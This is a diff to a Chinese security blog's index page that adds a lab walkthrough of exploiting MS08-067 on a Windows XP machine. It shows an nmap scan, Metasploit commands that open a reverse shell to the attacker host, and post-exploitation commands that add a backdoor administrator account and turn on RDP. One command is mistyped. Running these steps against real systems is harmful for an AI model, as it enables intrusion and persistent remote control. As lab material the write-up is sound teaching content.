@@ -181,6 +181,74 @@
         
 
 <div class="post">
+    <a href="/2024/07/12/MS08-067%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">
+        <h2 class="post-title">MS08-067漏洞利用</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/7/12
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="MS08-067漏洞利用"><a href="#MS08-067漏洞利用" class="headerlink" title="MS08-067漏洞利用"></a>MS08-067漏洞利用</h1><p>目标机器:192.168.1.7 Windows XP</p>
+<p>攻击机:192.168.1.12 Kali</p>
+<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><pre><code class="nmap">nmap -O -T4 -p445 -sV --script smb-vuln-ms08-067 192.168.1.7
+</code></pre>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210408140441521.png" alt="image-20210408140441521"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><pre><code class="nmap">service postgresql start
+msfconsole
+search 08-067
+use exploit/windows/smb/ms08_067_netapi
+show options
+set rhosts 192.168.1.7
+set payload windows/shell/reverse_tcp
+set lhost 192.168.1.12
+exploit
+</code></pre>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210408140542782.png" alt="image-20210408140542782"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210408141354688.png" alt="image-20210408141354688"></p>
+<p><strong>exploit</strong>命令执行后就成功利用漏洞进入了windows系统</p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210408141816252.png" alt="image-20210408141816252"></p>
+<p>进入windows系统后执行以下命令，新建用户方便进入winows系统</p>
+<pre><code class="shell">net user hacker 123456 /add      hacker:用户名 123456:密码
+net localhost administrators hacker /add  hacker:用户名    --将hacker用户添加至管理员组
+REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  开启3389端口
+</code></pre>
+<p>而后kali新打开一个shell窗口，输入以下命令进行远控登录:</p>
+<pre><code class="shell">rdesktop 192.168.1.7
+</code></pre>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210408142450690.png" alt="image-20210408142450690"></p>
+<p><img src="https://fastly.jsdelivr.net/gh/xccit/blog_images/images_resource/image-20210408142515324.png" alt="image-20210408142515324"></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E4%BF%A1%E5%AE%89/" style="color: #ffa2c4">信安</a>
+        </span>
+        
+    </div>
+    <a href="/2024/07/12/MS08-067%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2024/07/12/SpringBoot%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%90%AF%E6%95%B0%E6%8D%AE%E6%BA%90%E5%8A%A0%E5%AF%86/">
         <h2 class="post-title">SpringBoot项目开启数据源加密</h2>
     </a>
@@ -273,7 +341,7 @@ public class TestDBAuth &#123;
         
         <span class="tag">
             
-            <a href="/tags/SpringBoot/" style="color: #00bcd4">SpringBoot</a>
+            <a href="/tags/SpringBoot/" style="color: #ffa2c4">SpringBoot</a>
         </span>
         
     </div>
